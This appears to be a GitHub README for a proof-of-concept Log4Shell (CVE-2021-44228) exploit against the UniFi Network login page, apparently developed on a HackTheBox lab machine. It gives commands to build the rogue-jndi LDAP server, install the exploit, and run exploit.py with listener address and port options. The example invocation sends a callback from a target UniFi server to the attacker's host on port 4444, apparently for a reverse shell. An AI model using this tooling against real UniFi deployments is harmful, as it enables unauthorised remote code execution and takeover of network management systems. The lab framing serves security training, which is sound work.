### log4shell_unifi

Proof of concept for [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228) exploit in UniFi Network web application login page

Tested on [HTB: Unified](https://app.hackthebox.com/machines/Unified)

### Installation

This script uses [rogue-jndi](https://github.com/veracode-research/rogue-jndi). First, ensure that Java and Maven are installed on your host then run the following:

```sh
git clone https://github.com/veracode-research/rogue-jndi \
    && cd rogue-jndi && mvn package
```

Clone the GitHub repository and install python requirements:

```sh
git clone https://github.com/jb49088/poc.git \
    && cd poc/log4shell_unifi \
    && pip install -r requirements.txt --break-system-packages
```

### Usage

```
usage: exploit.py [-h] --path PATH --url URL --lhost LHOST --lport LPORT

options:
  -h, --help     show this help message and exit
  --path PATH    Path to RogueJndi-1.1.jar.
  --url URL      Base URL for UniFi Network manager.
  --lhost LHOST  The listen address for the payload.
  --lport LPORT  The listen port for the payload.
```

### Example

```sh
python exploit.py --url https://unifi.acme.com:8443 --lhost 10.0.0.1 --lport 4444 --path rogue-jndi/target/RogueJndi-1.1.jar
```
